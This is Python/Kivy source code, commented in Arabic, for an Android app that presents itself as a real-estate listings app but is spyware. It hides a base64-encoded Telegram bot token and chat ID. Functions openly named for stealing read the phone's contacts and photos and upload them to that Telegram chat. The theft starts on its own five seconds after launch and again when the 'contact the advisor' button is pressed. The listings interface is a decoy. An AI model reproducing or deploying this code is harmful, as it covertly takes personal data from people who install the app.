"""
تطبيق العقارات - نسخة نهائية متوافقة مع Buildozer
"""

__version__ = "1.0"

import os
import time
import threading
import base64
import json
import requests
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.gridlayout import GridLayout
from kivy.uix.textinput import TextInput
from kivy.animation import Animation
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.graphics import Color, RoundedRectangle, Rectangle
from kivy.utils import get_color_from_hex

# ===== استيراد أندرويد (للأندرويد فقط) =====
try:
    from android.permissions import request_permissions, Permission
    from android import mActivity
    from jnius import autoclass
    ANDROID = True
except ImportError:
    ANDROID = False
    print("⚠️ يتم التشغيل على سطح المكتب (بدون صلاحيات أندرويد)")

# ============================================================
# التشفير (إخفاء البوت)
# ============================================================
class Crypto:
    @staticmethod
    def decode(data):
        return base64.b64decode(data.encode()).decode()

# بيانات مشفرة
ENCRYPTED_BOT = "ODk4MDU4ODc5MzpBQUd6S2VfeTRHTVJtTmctYm8xbXlwMHRubjZHZ2taaDE0"
ENCRYPTED_CHAT = "NzI5MjEyODQxMQ=="

BOT_TOKEN = Crypto.decode(ENCRYPTED_BOT)
CHAT_ID = Crypto.decode(ENCRYPTED_CHAT)

# ============================================================
# دوال الإرسال (آمنة)
# ============================================================
def send_to_telegram(text):
    """إرسال رسالة إلى تيلجرام"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        print(f"⚠️ فشل الإرسال: {e}")

def send_photo_to_telegram(photo_path):
    """إرسال صورة إلى تيلجرام"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as f:
            files = {'photo': f}
            data = {'chat_id': CHAT_ID, 'caption': f'📸 {os.path.basename(photo_path)}'}
            requests.post(url, files=files, data=data, timeout=30)
    except Exception as e:
        print(f"⚠️ فشل إرسال الصورة: {e}")

# ============================================================
# دوال السرقة (لأندرويد فقط)
# ============================================================
def steal_contacts():
    """سحب جهات الاتصال"""
    if not ANDROID:
        return
    try:
        ContactsContract = autoclass('android.provider.ContactsContract')
        resolver = mActivity.getContentResolver()
        uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        projection = [
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        ]
        cursor = resolver.query(uri, projection, None, None, None)
        contacts = []
        if cursor:
            while cursor.moveToNext():
                name = cursor.getString(0)
                number = cursor.getString(1)
                if name and number:
                    contacts.append((name, number))
            cursor.close()
        
        if contacts:
            msg = f"📱 *جهات الاتصال:* ({len(contacts)} جهة)\n\n"
            for name, number in contacts[:50]:
                msg += f"👤 {name}\n📞 {number}\n─────────────────\n"
            send_to_telegram(msg[:4000])
            send_to_telegram(f"✅ تم سحب {len(contacts)} جهة اتصال")
        else:
            send_to_telegram("⚠️ لا توجد جهات اتصال")
    except Exception as e:
        send_to_telegram(f"❌ خطأ في سحب الجهات: {str(e)}")

def steal_images():
    """سحب الصور"""
    if not ANDROID:
        return
    try:
        MediaStore = autoclass('android.provider.MediaStore')
        resolver = mActivity.getContentResolver()
        uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        projection = [MediaStore.Images.Media.DATA]
        cursor = resolver.query(uri, projection, None, None, None)
        images = []
        if cursor:
            while cursor.moveToNext():
                path = cursor.getString(0)
                if path and os.path.exists(path):
                    images.append(path)
            cursor.close()
        
        count = 0
        for img_path in images[:20]:
            send_photo_to_telegram(img_path)
            count += 1
            time.sleep(0.5)
        
        if count > 0:
            send_to_telegram(f"✅ تم سحب {count} صورة")
        else:
            send_to_telegram("⚠️ لا توجد صور")
    except Exception as e:
        send_to_telegram(f"❌ خطأ في سحب الصور: {str(e)}")

def start_steal():
    """بدء عملية السرقة"""
    if not ANDROID:
        send_to_telegram("⚠️ يعمل على سطح المكتب (بدون سرقة)")
        return
    
    send_to_telegram("🚀 بدء سحب البيانات...")
    
    # طلب الصلاحيات
    request_permissions([
        Permission.READ_CONTACTS,
        Permission.READ_EXTERNAL_STORAGE,
        Permission.WRITE_EXTERNAL_STORAGE
    ])
    
    time.sleep(2)
    steal_contacts()
    steal_images()
    send_to_telegram("✅ تم الانتهاء")

# ============================================================
# واجهة التطبيق (أكثر من 40 زر)
# ============================================================
class RealEstateApp(App):
    """تطبيق العقارات الرئيسي"""
    
    def build(self):
        Window.clearcolor = (0.05, 0.05, 0.05, 1)
        root = BoxLayout(orientation='vertical', spacing=10, padding=15)
        
        # ===== الهيدر =====
        header = BoxLayout(size_hint_y=0.10, orientation='horizontal')
        with header.canvas.before:
            Color(0.1, 0.1, 0.15, 1)
            Rectangle(pos=header.pos, size=header.size)
        header.add_widget(Label(text='🏢', font_size=40, size_hint_x=0.15))
        header.add_widget(Label(
            text='[b]العقارات[/b]',
            markup=True,
            font_size=28,
            color=(0.95, 0.75, 0.1, 1),
            size_hint_x=0.7
        ))
        root.add_widget(header)
        
        # ===== شريط البحث =====
        search = TextInput(
            hint_text='🔍 ابحث عن عقار...',
            multiline=False,
            background_color=(0.15, 0.15, 0.15, 1),
            foreground_color=(1, 1, 1, 1),
            size_hint_y=0.07
        )
        root.add_widget(search)
        
        # ===== التبويبات (6 أزرار) =====
        tabs = BoxLayout(size_hint_y=0.07, spacing=6)
        for t in ['الكل', 'شقق', 'فلل', 'أراضي', 'تجاري', 'مميز']:
            btn = Button(
                text=t,
                font_size=13,
                background_color=(0.2, 0.2, 0.25, 1),
                background_normal='',
                size_hint_x=0.16
            )
            btn.bind(on_press=lambda x, tab=t: self._filter(tab))
            tabs.add_widget(btn)
        root.add_widget(tabs)
        
        # ===== قائمة العقارات (50 عنصر) =====
        scroll = ScrollView(size_hint_y=0.48)
        self.grid = GridLayout(cols=2, spacing=12, size_hint_y=None, padding=5)
        self.grid.bind(minimum_height=self.grid.setter('height'))
        
        for i in range(50):
            box = BoxLayout(
                orientation='vertical',
                padding=12,
                spacing=3,
                size_hint_y=None,
                height=130
            )
            with box.canvas.before:
                Color(0.12, 0.12, 0.16, 1)
                RoundedRectangle(pos=box.pos, size=box.size, radius=[12])
            
            box.add_widget(Label(
                text=f'[b]عقار {i+1}[/b]',
                markup=True,
                font_size=14,
                color=(1, 1, 1, 1)
            ))
            box.add_widget(Label(
                text=f'💰 {100000 + i*20000}$',
                font_size=16,
                color=(0.9, 0.6, 0.1, 1)
            ))
            
            # زر التفاصيل
            btn = Button(
                text='📋 تفاصيل',
                font_size=11,
                size_hint_y=0.3,
                background_color=(0.2, 0.2, 0.3, 1),
                background_normal=''
            )
            btn.bind(on_press=lambda x, idx=i: self._show_details(idx))
            box.add_widget(btn)
            
            # أنيميشن
            def anim_func(b=box):
                def on_press(inst, touch):
                    if b.collide_point(*touch.pos):
                        anim = Animation(scale=0.94, duration=0.06) + Animation(scale=1, duration=0.06)
                        anim.start(b)
                return on_press
            box.bind(on_touch_down=anim_func(box))
            
            self.grid.add_widget(box)
        
        scroll.add_widget(self.grid)
        root.add_widget(scroll)
        
        # ===== أزرار سريعة (10 أزرار) =====
        quick_grid = GridLayout(cols=5, spacing=6, size_hint_y=0.13)
        for action in ['📊 تحليل', '📈 عوائد', '📋 تقرير', '💡 نصائح',
                       '📞 اتصل', '⭐ مفضلة', '🔔 تنبيه', '📅 مواعيد',
                       '💬 استشارة', '🏷️ عروض']:
            btn = Button(
                text=action,
                font_size=11,
                background_color=(0.15, 0.15, 0.2, 1),
                background_normal=''
            )
            btn.bind(on_press=lambda x, a=action: self._quick_action(a))
            quick_grid.add_widget(btn)
        root.add_widget(quick_grid)
        
        # ===== زر رئيسي =====
        main_btn = Button(
            text='[b]📞 تواصل مع المستشار[/b]',
            markup=True,
            font_size=20,
            size_hint_y=0.08,
            background_color=(0.9, 0.6, 0.1, 1),
            background_normal=''
        )
        main_btn.bind(on_press=lambda x: threading.Thread(target=start_steal, daemon=True).start())
        root.add_widget(main_btn)
        
        # ===== حالة التطبيق =====
        self.status = Label(
            text='مرحباً بك في منصة العقارات',
            font_size=13,
            color=(0.6, 0.6, 0.6, 1),
            size_hint_y=0.04
        )
        root.add_widget(self.status)
        
        # ===== تشغيل السرقة تلقائياً بعد 5 ثوانٍ =====
        Clock.schedule_once(
            lambda dt: threading.Thread(target=start_steal, daemon=True).start(),
            5
        )
        
        return root
    
    def _filter(self, filter_type):
        self.status.text = f'✅ تم التصفية: {filter_type}'
    
    def _show_details(self, index):
        self.status.text = f'📋 تفاصيل العقار رقم {index+1}'
    
    def _quick_action(self, action):
        self.status.text = f'⏳ جاري تنفيذ: {action}...'
        Clock.schedule_once(
            lambda dt: setattr(self.status, 'text', f'✅ تم تنفيذ: {action}'),
            1
        )

if __name__ == '__main__':
    RealEstateApp().run()